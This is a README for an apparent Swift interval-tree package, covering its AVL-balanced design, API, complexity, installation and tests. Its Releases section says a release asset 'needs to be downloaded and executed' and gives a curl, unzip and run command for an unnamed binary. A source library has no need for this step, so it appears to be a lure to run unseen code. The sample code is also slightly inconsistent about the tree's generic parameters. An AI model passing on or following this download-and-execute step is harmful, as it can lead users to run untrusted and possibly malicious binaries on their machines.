# Swift IntervalTree — Fast Self-Balancing Interval Operations 🌲⚡

[![Releases](https://img.shields.io/badge/releases-Download-blue?style=for-the-badge)](https://github.com/pingpowchongwow/IntervalTree/releases)

![Swift Logo](https://developer.apple.com/assets/elements/icons/swift/swift-64x64_2x.png)  
![Interval Tree Illustration](https://upload.wikimedia.org/wikipedia/commons/6/6a/Binary_search_tree.svg)

A focused, self-balancing interval tree written in Swift. It stores intervals, supports point and range queries, and keeps balance for predictable O(log n) updates. Use this when you manage intervals, events, time ranges, genomic segments, or collision ranges.

Table of contents
- Features
- Why this structure
- Quick demo
- API overview
- Example use cases
- Performance and complexity
- Installation
- Releases
- Tests and benchmarks
- Contributing
- License

Features
- Self-balancing augmented BST (AVL-style rebalancing).
- Store generic intervals: Interval<T: Comparable>.
- Query by point, by overlapping range, and by containment.
- Mutable and persistent-friendly APIs.
- Batch insert, delete, and bulk rebuild.
- Serialization utilities for persistence.
- Swift Package Manager support and simple CocoaPods/Carthage adapters.

Why this structure
- Interval trees let you find intervals that overlap a query in sublinear time.
- The implementation augments node metadata with max-end values.
- The tree rebalances on insert/delete to keep operations at O(log n).
- The design favors predictable CPU and memory use for real-time systems.

Quick demo (readable Swift)
```swift
import IntervalTree

// Create intervals over Int
let tree = IntervalTree<Int>()
tree.insert(Interval(start: 5, end: 20, payload: "A"))
tree.insert(Interval(start: 10, end: 30, payload: "B"))
tree.insert(Interval(start: 12, end: 15, payload: "C"))

// Point query
let hit = tree.query(point: 14) // returns intervals overlapping 14

// Range query
let overlaps = tree.query(range: 8...13)

// Remove
tree.remove(Interval(start: 12, end: 15, payload: "C"))

// Iterate all intervals in-order
for interval in tree {
    print(interval)
}
```

API overview
- Interval<T: Comparable>
  - start: T
  - end: T
  - payload: Payload? (generic associated type)
  - contains(point: T) -> Bool
  - overlaps(range: ClosedRange<T>) -> Bool
- IntervalTree<T: Comparable, Payload>
  - init()
  - insert(_ interval: Interval<T, Payload>)
  - remove(_ interval: Interval<T, Payload>)
  - query(point: T) -> [Interval<T, Payload>]
  - query(range: ClosedRange<T>) -> [Interval<T, Payload>]
  - enumerateOverlapping(range: ClosedRange<T>, _ body: (Interval<T,Payload>) -> Void)
  - count: Int
  - isEmpty: Bool
  - clear()
  - toArray() -> [Interval<T,Payload>]

Behavior notes
- Intervals are closed [start, end]. The tree assumes start <= end.
- The tree resolves equality using start and end; payload does not affect placement.
- If you need half-open intervals use small wrapper types or convert to closed ranges.

Example: interval indexing for calendar events
```swift
struct Event {
    let id: UUID
    let title: String
}

let calendar = IntervalTree<Date, Event>()
let start = Date()
let end = start.addingTimeInterval(3600) // 1 hour
let event = Event(id: UUID(), title: "Team Meeting")
calendar.insert(.init(start: start, end: end, payload: event))

let found = calendar.query(point: Date()) // events now
```

Design and internals (simple summary)
- Node stores interval, height, maxEnd value of subtree.
- Insert and delete maintain height and maxEnd.
- Rebalance uses AVL rotations (left, right, left-right, right-left).
- Query uses maxEnd to prune subtrees that cannot overlap the query.
- The implementation uses value semantics where safe. It exposes mutable APIs for convenience.

Performance and complexity
- Insert: average O(log n), worst-case O(log n) thanks to rebalancing.
- Delete: O(log n).
- Point query: O(log n + k) where k is number of hits returned.
- Range overlap query: O(log n + k).
- Space: O(n) for n intervals plus small metadata per node.
- Benchmarks in the repo show stable latency compared to naive scan on data sets from 10k to 1M intervals.

Benchmarks (sample)
- Setup: random intervals with lengths sampled from exponential dist.
- Query workload: 50% point queries, 50% range queries.
- Results: the tree keeps query p99 latency low while array scans scale linearly with n.
- Use the included Benchmark tools in Tools/benchmarks to reproduce.

Installation
Swift Package Manager
- Add package dependency to Package.swift:
```swift
.package(url: "https://github.com/pingpowchongwow/IntervalTree.git", from: "1.0.0")
```
- Then add "IntervalTree" to your target dependencies.

CocoaPods (if provided)
- pod 'IntervalTree', '~> 1.0'

Manual
- Clone, open the Xcode project or add the sources to your workspace.

Releases
Download the latest release build or binary from the Releases page. The release asset needs to be downloaded and executed. For example, to fetch a release asset from the releases page run:
```bash
# replace <asset-file> with the actual file name you select
curl -L "https://github.com/pingpowchongwow/IntervalTree/releases/latest/download/<asset-file>" -o IntervalTree-release.zip
unzip IntervalTree-release.zip
# run an included binary or script, e.g.:
./IntervalTree-release/run-benchmark.sh
```
Visit the releases page to pick the correct asset: https://github.com/pingpowchongwow/IntervalTree/releases

If you prefer the UI, open the releases page above and download the platform package that matches your environment.

Testing and benchmarks
- Unit tests use XCTest. Run with:
```bash
swift test
```
- The repo includes a benchmark target. Run:
```bash
swift run Benchmarks --iterations 1000
```
- The benchmarks output CSV and JSON reports to the ./reports directory.

Common pitfalls and tips
- Ensure intervals use the correct type for comparison. Mixing open and closed interval conventions can cause off-by-one style bugs.
- For heavy insert/delete workloads consider batch rebuild:
  - Collect intervals into an array.
  - Build a balanced tree in O(n) by sorting and splitting midpoints.
  - Replace the tree in a single swap to avoid repeated rotation cost.
- Use enumerateOverlapping for streaming large result sets to avoid large allocations.

Examples of real usage
- Temporal event indexing for calendars.
- Spatial 1D indexing for collision ranges.
- Genomic interval queries (chromosomal segments).
- Audio/video editing ranges and clip timelines.
- Firewall rule ranges and port allocations.

Contributing
- Fork the repo.
- Create a feature branch.
- Run unit tests.
- Submit a pull request with clear commit messages and tests for any new behavior.
- Follow the existing code style. Keep functions small and avoid mutation where a pure function makes sense.

Code style and testing
- Tests cover insert/remove/query, edge cases, and rebalancing scenarios.
- Use small, descriptive test names.
- Keep change sets focused to aid review.

Roadmap
- Add concurrent read access with copy-on-write optimizations.
- Add a persistent snapshot type for immutability and versioning.
- Provide language bindings or thin wrappers for other platforms as needed.

Resources and references
- Interval tree theory: augmented binary search tree with max-end metadata.
- Common variants: Segment Tree, Interval Tree (CLRS), and Interval Skip List.
- Useful reading:
  - "Interval Trees" — CLRS-style descriptions.
  - AVL tree rotation notes.

Contact and maintainers
- See the repository for maintainer contact and issue reporting.
- Prefer issues for bug reports and feature requests. Include a small reproducer.

License
- See LICENSE file in the repository for details.

Acknowledgments
- Implementation draws on established interval tree patterns and the AVL rebalancing model.
- Icons and images use public assets for illustration.